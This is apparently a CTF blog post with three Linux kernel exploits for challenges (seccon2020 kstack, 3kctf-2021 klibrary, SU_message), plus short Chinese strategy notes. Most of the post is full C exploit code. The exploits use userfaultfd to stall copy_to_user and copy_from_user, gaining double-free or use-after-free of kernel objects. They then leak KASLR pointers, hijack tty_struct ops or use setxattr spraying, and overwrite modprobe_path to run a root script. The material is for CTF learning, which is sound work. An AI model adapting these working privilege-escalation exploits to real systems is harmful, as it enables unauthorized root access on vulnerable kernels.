---
title: userfaultfd
date: 2022-03-13 23:26:39
tags:
    - uffd
    - kernel
---


### seccon2020 - kstack

```c
#define _GNU_SOURCE
#include <inttypes.h>
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/xattr.h>

#define PUSH (0x57ac0001)
#define POP  (0x57ac0002)


#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
uint64_t leak;
uint64_t modprobe;
static int page_size;

static void *
fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    ssize_t nread;

    uffd = (long) arg;

    /* Loop, handling incoming events on the userfaultfd
        file descriptor. */

    for (;;) {

        /* See what poll() tells us about the userfaultfd. */

        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1)
            errExit("poll");

        printf("\n--------------------------------\n");
        printf("fault_handler_thread():\n");

        /* Read an event from the userfaultfd. */

        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0) {
            printf("EOF on userfaultfd!\n");
            exit(EXIT_FAILURE);
        }

        if (nread == -1)
            errExit("read");

        /* We expect only one kind of event; verify that assumption. */

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        /* 
        * Display info about the page-fault event.
        * msg.arg.pagefault.address
        * msg.arg.pagefault.flags  
        * flags = 0 fault raised by reading this region;
        * flags = 1 fault raised by writting to this region;
        */

        printf("fault flags   = %"PRIx64"\n", msg.arg.pagefault.flags);
        printf("fault address = %"PRIx64"\n", msg.arg.pagefault.address);

        if(msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE)
        {
            puts("WRITE FAULT");
            /* double free */
            int tmp;
            pop(&tmp);

            /* unregister the page fault region */
            struct uffdio_range range;
            range.start = msg.arg.pagefault.address & ~(page_size - 1);
            range.len = page_size;
            if (ioctl(uffd, UFFDIO_UNREGISTER, &range) == -1)
                errExit("unregister fault");
        
            /* wake up the blocking main thread */
            if (ioctl(uffd, UFFDIO_WAKE, &range) == -1)
                errExit("wake up fault");
        
        }
        else
        {
            puts("READ FAULT");
            
            if(fault_cnt == 0)
            {
                pop(&leak);
                printf("leak => 0x%llx",leak);

                /* demonstrate UFFDIO_COPY handle method */
                static char *page = NULL;
                if (page == NULL) {
                    page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
                    if (page == MAP_FAILED)
                        errExit("mmap");
                }
                memset(page, 'A', page_size);

                struct uffdio_copy uffdio_copy;
                uffdio_copy.src = (unsigned long) page;
                uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address & ~(page_size - 1);
                uffdio_copy.len = page_size;
                uffdio_copy.mode = 0;
                uffdio_copy.copy = 0;
                if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                    errExit("ioctl-UFFDIO_COPY");
            }
            else
            {
                puts("setxattr"); // do not wake up main thread, for that will free the obj
                char *p = "/tmp/x";
                push(p);
                push(p);

                /* unregister the page fault region */
                struct uffdio_range range;
                range.start = msg.arg.pagefault.address & ~(page_size - 1);
                range.len = page_size;
                if (ioctl(uffd, UFFDIO_UNREGISTER, &range) == -1)
                    errExit("unregister fault");
            
                /* wake up the blocking main thread */
                if (ioctl(uffd, UFFDIO_WAKE, &range) == -1)
                    errExit("wake up fault");
            }
        }

        fault_cnt++;
    }
}

int fd;
void push(unsigned int* addr)
{
    ioctl(fd,PUSH,addr);
}
void pop(unsigned int* addr)
{
    ioctl(fd,POP,addr);
}

int
main(int argc, char *argv[])
{
    long uffd;          /* userfaultfd file descriptor */
    char *addr;         /* Start of region handled by userfaultfd */
    uint64_t len;       /* Length of region handled by userfaultfd */
    pthread_t thr,thr2;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    page_size = sysconf(_SC_PAGE_SIZE);
    len = 4 * page_size;

    /* Create and enable userfaultfd object. */

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    /* Create a private anonymous mapping. The memory will be
        demand-zero paged--that is, not yet allocated. When we
        actually touch the memory, it will be allocated via
        the userfaultfd. */

    addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED)
        errExit("mmap");

    printf("Address returned by mmap() = %p\n", addr);

    /* Register the memory range of the mapping we just created for
        handling by the userfaultfd object. In mode, we request to track
        missing pages (i.e., pages that have not yet been faulted in). */

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    /* Create a thread that will process the userfaultfd events. */

    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
        errno = s;
        errExit("pthread_create");
    }

    system("echo -ne '#!/bin/sh\n/bin/chmod o+r /flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    
    /* Alloc a object in kmalloc-32 and prepare to leak */
    
    int tmp = open("/proc/self/stat", O_RDONLY);
    close(tmp);

    /* begin exploit */

    fd = open("/proc/stack",O_RDWR);
    push(addr);
    
    uint64_t temp = 0xdeadbeef;
    push(&temp);
    pop(addr + page_size);
    
    modprobe = leak - 0xffffffff8113be80 + 0xffffffff81c2c540 ;
    printf("modprobe path => 0x%llx",modprobe);
    fflush(stdout);

    *(uint64_t*)(addr + 2*page_size - 8) = modprobe - 8;
    setxattr("/init", "KKKK", (void*)(addr + 2*page_size -8), 0x20, XATTR_CREATE);

    system("/tmp/dummy");
    system("cat /flag");
    exit(EXIT_SUCCESS);
}
```

### 3kctf-2021-klibrary

* 思路

1. ioctl 中有两个lock，一个用于脱除双向链表的全部节点并free，一个用于 add, free, edit, show操作。

2. 题目开启 smep, smap, kpti, kaslr, kptr_restrict, dmesg_restrict, perf_event_paranoid。

3. 允许使用 userfaultfd

4. LEAK: copy_to_user触发page fault时, remove_all, 并且打开ptmx驱动，占用这个kernel_buf, 处理好fault之后便可以leak出heap ptr，以及text ptr。

5. HIJACK: copy_from_user触发page fault之后, remove_all, 打开ptmx占用这个kernel_buf, 伪造user_buff, 修改tty_struct的ops指针,使其指向另一个可控内核堆地址, 回到main thread。
6. 提权: 控制ops的ioctl函数指针为gadget，修改modprobe_path, 之后...

* to Say

1. 高版本的内核有很多保护，书写exp时尽量缩短执行链，免得触发莫名的错误。尽量不要妄想在在繁忙的kmem_cache上，double free，也就是尽量不要破坏slub系统，内核中内存申请与释放是频繁的。
<br>

2. uaf一个对象，尽量在保全其结构的前提下，修改所需要的指针。

* poc

```c
#define _GNU_SOURCE
#include <inttypes.h>
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <assert.h>

#define stop(msg)    { write(1, msg, strlen(msg)); getchar(); }
#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

static int page_size;

/*************************header***************************/

#define ADD    0x3000 
#define FREE   0x3001
#define REMOVE 0x3002 
#define EDIT   0x3003
#define SHOW   0x3004

typedef struct _item
{
    char buf[0x300];
    unsigned long arg;
    struct _item* FD;
    struct _item* BK;
}item;

typedef struct _arg
{
    unsigned long ID;
    char *uptr;
}uarg;

/*************************header***************************/


/*************************global var***************************/

int fd;
int ptmx_fd;
uint64_t k_ptr;
uint64_t h_ptr;
uint64_t modprobe_path;

/*************************global var***************************/



/*************************LKM ops***************************/


static void add(unsigned long id)
{
    uarg obj;
    obj.ID = id;
    obj.uptr = NULL;
    ioctl(fd, ADD, &obj);
}
static void del(unsigned long id)
{
    uarg obj;
    obj.ID = id;
    obj.uptr = NULL;
    ioctl(fd, FREE, &obj);
}
static void remove_all()  
{
    uarg obj;
    obj.ID = 0xdeadbeef;
    obj.uptr = NULL;
    ioctl(fd, REMOVE, &obj);
}
static void show(int id, char *ptr)
{
    uarg obj;
    obj.ID = id;
    obj.uptr = ptr;
    ioctl(fd, SHOW, &obj);
}
static void edit(int id, char *ptr)
{
    uarg obj;
    obj.ID = id;
    obj.uptr = ptr;
    ioctl(fd, EDIT, &obj);
}

void print(uint64_t *ptr, unsigned long len)
{
    for(int i=0; i <= len/8; i++)
    {
        printf("[%02x] %04llx => %016llx \n",i,i*8,ptr[i]);
    }
}

/*************************LKM ops***************************/



static void *
fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;


    /* Loop, handling incoming events on the userfaultfd
        file descriptor. */

    for (;;) {

        /* See what poll() tells us about the userfaultfd. */

        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1)
            errExit("poll");

        printf("\n-------------------------\nfault_handler_thread():\n");

        /* Read an event from the userfaultfd. */

        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0) {
            printf("EOF on userfaultfd!\n");
            exit(EXIT_FAILURE);
        }

        if (nread == -1)
            errExit("read");

        /* We expect only one kind of event; verify that assumption. */

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        /* Display info about the page-fault event. */

        printf("flags   = %"PRIx64"\n", msg.arg.pagefault.flags);
        printf("address = %"PRIx64"\n", msg.arg.pagefault.address);

        /* Copy the page pointed to by 'page' into the faulting
            region. Vary the contents that are copied in, so that it
            is more obvious that each fault is handled separately. */
        if(msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE)
        {
            printf("WRITE fault\n");
            remove_all();
            close(open("/dev/ptmx", O_RDWR | O_NOCTTY));
            
            struct uffdio_range range;
            range.start =  (unsigned long) msg.arg.pagefault.address & ~(page_size - 1);
            range.len   =  page_size;
            assert(ioctl(uffd, UFFDIO_UNREGISTER, &range) != -1);
            assert(ioctl(uffd, UFFDIO_WAKE, &range) != -1);
        }
        else
        {
            printf("READ fault\n");
            remove_all();
            ptmx_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
            assert(ptmx_fd > 3);
            
            uint64_t* former_page = (uint64_t*)((msg.arg.pagefault.address & ~(page_size - 1)) - page_size);
            former_page[0] = 0x0000000100005401;
            former_page[1] = 0;
            former_page[2] = h_ptr - 0xffff888007250400 + 0xffff888000047e40;
            former_page[3] = h_ptr - 0xffff88800724e400 + 0xffff88800724e800;
            
            // print(former_page, 0x300);
            // stop("break1");

            /* We need to handle page faults in units of pages(!).
                So, round faulting address down to page boundary. */

            uffdio_copy.src = (unsigned long) former_page;
            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address & ~(page_size - 1);
            uffdio_copy.len = page_size;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");
        }
        fault_cnt++;
    }
}

int
main(int argc, char *argv[])
{
    long uffd;          /* userfaultfd file descriptor */
    char *addr;         /* Start of region handled by userfaultfd */
    uint64_t len;       /* Length of region handled by userfaultfd */
    pthread_t thr;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    page_size = sysconf(_SC_PAGE_SIZE);
    len = 8 * page_size;

    /* Create and enable userfaultfd object. */

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    /* Create a private anonymous mapping. The memory will be
        demand-zero paged--that is, not yet allocated. When we
        actually touch the memory, it will be allocated via
        the userfaultfd. */

    addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED)
        errExit("mmap");

    printf("Address returned by mmap() = %p\n", addr);

    /* Register the memory range of the mapping we just created for
        handling by the userfaultfd object. In mode, we request to track
        missing pages (i.e., pages that have not yet been faulted in). */

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    /* Create a thread that will process the userfaultfd events. */

    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
        errno = s;
        errExit("pthread_create");
    }

    fd = open("/dev/library",O_RDWR);
    assert(fd > 2);

    add(1);
    show(1, addr);
    h_ptr = ((uint64_t*)(addr))[0x40]; // ffff88800724e400
    k_ptr = ((uint64_t*)(addr))[0x4d]; // ffffffff8114ec30
    modprobe_path = k_ptr - 0xffffffff8114ec30 + 0xffffffff81837d00;

    printf("k_ptr => 0x%llx \n",k_ptr);
    printf("h_ptr => 0x%llx \n",h_ptr);
    printf("modprobe_path => 0x%llx \n",modprobe_path);

    add(1);
    edit(1, addr + page_size);

    char *vft = malloc(0x300);
    char *x = "/tmp/x";
    memset(vft, 0, 0x300);
    *(uint64_t*)(vft + 96) = k_ptr - 0xffffffff8114ec30 + 0xffffffff8113e9b0;
    /*
    0xffffffff8113e9b0  <=  mov qword ptr [rdx], rsi ; ret
    0xffffffff81018c30  <=  mov qword ptr [rsi], rdx ; ret
    */
    add(1);
    edit(1, vft);
    
    stop("break2");
    
    ioctl(ptmx_fd, *(uint32_t*)(x + 0), modprobe_path + 0);
    ioctl(ptmx_fd, *(uint32_t*)(x + 4), modprobe_path + 4);
    
    system("echo -ne '#!/bin/sh\n/bin/chmod o+r /flag.txt' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    system("/tmp/dummy");
    system("cat /flag.txt");

}

```

### SU_message

1. 较之不同的是，启用了两个monitor thread, 这使得在thread1里触发thread2，在thread2里wake_up thread1.更加精准得控制control flow。
2. setxattr + userfaultfd

```c
#define _GNU_SOURCE
#include <inttypes.h>
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <assert.h>

#define stop(msg)    { write(1, msg, strlen(msg)); getchar(); }
#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

static int page_size;

/*************************header***************************/


#define SU_message_set_flag 0x2001
#define SU_message_set_string 0x2002
#define SU_message_release 0x2003

#define SU_message_is_flag 0x3001
#define SU_message_is_string 0x3002

#define SU_open	1000
#define	SU_config 1001	

struct SU_message_context
{
	char *message_name;
	unsigned int size;
	int type;
	char *message_content;
	unsigned int message_len;
};

/*************************header***************************/


/*************************global var***************************/
char *page1, *page2, *page3;
int one_thread_have_did = 0;
uint64_t k_ptr;
uint64_t h_ptr;
uint64_t modprobe_path;

long uffd1;          /* userfaultfd file descriptor */
long uffd2;          /* userfaultfd file descriptor */

/*************************global var***************************/


static void *
fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    ssize_t nread;

    uffd = (long) arg;



    /* Loop, handling incoming events on the userfaultfd
        file descriptor. */

    for (;;) {

        /* See what poll() tells us about the userfaultfd. */

        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1)
            errExit("poll");

        printf("\n-------------------------\n");
        printf("fault_handler_thread():\n");
        printf("tid %d \n", gettid());
        /* Read an event from the userfaultfd. */

        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0) {
            printf("EOF on userfaultfd!\n");
            exit(EXIT_FAILURE);
        }

        if (nread == -1)
            errExit("read");

        /* We expect only one kind of event; verify that assumption. */

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        /* Display info about the page-fault event. */

        printf("flags   = %"PRIx64"\n", msg.arg.pagefault.flags);
        printf("address = %"PRIx64"\n", msg.arg.pagefault.address);

        /* Copy the page pointed to by 'page' into the faulting
            region. Vary the contents that are copied in, so that it
            is more obvious that each fault is handled separately. */
        if(msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE)
        {
            printf("WRITE fault\n");
        }
        else
        {
            printf("READ fault\n");
            if (!one_thread_have_did)
            {
                one_thread_have_did = 1;
                stop("free")
                syscall(SU_config, 0, SU_message_release);
                
                char *tmp = page2+page_size-0x18;
                ((uint64_t*)(tmp))[0] = 0xdeadbeef;
                ((uint64_t*)(tmp))[1] = 0x0000300100001000;
                ((uint64_t*)(tmp))[2] = 0xffffffff82c6c360-1; //modprobe_path-1
                setxattr("/init", "attr", tmp, 0x20-4, 0);
                stop("thread1 finish\n");
            }
            else
            {
                char* src_page = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); assert(src_page != NULL);
                memcpy(src_page, "/tmp/xxxxxxxxx", page_size);

                struct uffdio_copy uffdio_copy;
                uffdio_copy.src = (unsigned long) src_page;
                uffdio_copy.dst = page1;
                uffdio_copy.len = page_size;
                uffdio_copy.mode = 0;
                uffdio_copy.copy = 0;
                if (ioctl(uffd1, UFFDIO_COPY, &uffdio_copy) == -1)
                    errExit("ioctl-UFFDIO_COPY");
                stop("thread2 finish\n");
            }
        }
        fault_cnt++;
    }
}

int
main(int argc, char *argv[])
{

    char *addr;          /* Start of region handled by userfaultfd */
    uint64_t len;        /* Length of region handled by userfaultfd */
    pthread_t thr;       /* ID of thread that handles page faults */
    pthread_t thr2;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_api uffdio_api2;
    struct uffdio_register uffdio_register;
    struct uffdio_register uffdio_register2;
    int s;

    page_size = sysconf(_SC_PAGE_SIZE);
    len = 3 * page_size;

    /* Create and enable userfaultfd object. */

    uffd1 = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd1 == -1)
        errExit("userfaultfd");
    uffd2 = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd2 == -1)
        errExit("userfaultfd2");


    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd1, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");
    
    uffdio_api2.api = UFFD_API;
    uffdio_api2.features = 0;
    if (ioctl(uffd2, UFFDIO_API, &uffdio_api2) == -1)
        errExit("ioctl-UFFDIO_API2");
    /*  Create a private anonymous mapping. The memory will be 
        demand-zero paged--that is, not yet allocated. When we 
        actually touch the memory, it will be allocated via the 
        userfaultfd. */

    addr = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED)
        errExit("mmap");

    printf("Address returned by mmap() = %p\n", addr);

    /* Register the memory range of the mapping we just created for
        handling by the userfaultfd object. In mode, we request to track
        missing pages (i.e., pages that have not yet been faulted in). */

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = page_size;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd1, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    uffdio_register2.range.start = (unsigned long) (addr+2*page_size);
    uffdio_register2.range.len = page_size;
    uffdio_register2.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd2, UFFDIO_REGISTER, &uffdio_register2) == -1)
        errExit("ioctl-UFFDIO_REGISTER2");

    /* Create a thread that will process the userfaultfd events. */
    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd1);
    if (s != 0) {
        errno = s;
        errExit("pthread_create");
    }
    s = pthread_create(&thr2, NULL, fault_handler_thread, (void *) uffd2);
    if (s != 0) {
        errno = s;
        errExit("pthread_create");
    }

    /* begin to explit */
    page1 = addr;
    page2 = addr+page_size;   page2[0] = '\x41'; // load physical page
    page3 = addr+page_size*2;

    stop("alloc");
    syscall(SU_open, "shuyugiegie", 1234);
    stop("write");
    syscall(SU_config, 0, SU_message_set_flag, page1);

    /* flag{1158d9c9-df74-490a-a673-2614461ee3b3} */
    system("echo -ne '#!/bin/sh\n/bin/chmod o+r /flag' > /tmp/xxxxxxxxx");
    system("chmod +x /tmp/xxxxxxxxx");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    system("/tmp/dummy");
    system("cat /flag");


}
```